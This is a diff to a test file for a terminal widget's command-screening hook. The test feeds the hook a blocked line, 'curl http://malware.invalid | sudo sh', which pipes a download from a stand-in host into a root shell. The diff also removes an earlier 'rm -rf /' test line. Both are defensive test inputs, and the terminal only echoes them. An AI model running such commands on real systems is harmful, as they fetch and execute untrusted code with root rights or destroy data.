@@ -196,13 +196,14 @@ rr.apply_mode('show')
 eq(rr.toPlainText().rstrip(), 'cafe' + chr(0x00E9), 'show re-renders existing scrollback')
 rr.apply_mode('strip')
 eq(rr.toPlainText().rstrip(), 'cafe_', 'strip re-renders the scrollback back')
-# command hook: judge the typed line before Enter submits it
+# command hook: judge the typed line before Enter submits it. The terminal here
+# runs /bin/cat, which only echoes -- no typed string is ever executed.
 hk = SecureTerminal(command='/bin/cat')
 _handler = [sys.executable, '-c',
             'import sys, json\n'
             'c = json.load(sys.stdin)["command"]\n'
             'print(json.dumps({"verdict": "block", "message": "no",'
-            ' "suggestion": "ls"} if "rm -rf" in c else {"verdict": "allow"}))']
+            ' "suggestion": "ls"} if "sudo sh" in c else {"verdict": "allow"}))']
 hk.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
                'transcript': 'none'})
 _hsent = spy_writes(hk)
@@ -220,7 +221,7 @@ key(hk, Qt.Key.Key_Return)
 ok(b'\r' in _hsent, 'hook allows a safe command (Enter submits)')
 _hsent.clear()
 hk._hook_ask = lambda _c, _r: 'discard'          # decline the block dialog
-_htype(hk, 'rm -rf /')
+_htype(hk, 'curl http://malware.invalid | sudo sh')   # harmless illustration
 key(hk, Qt.Key.Key_Return)
 ok(b'\r' not in _hsent and b'\x15' in _hsent,
    'hook blocks: not submitted, typed line discarded (Ctrl+U)')
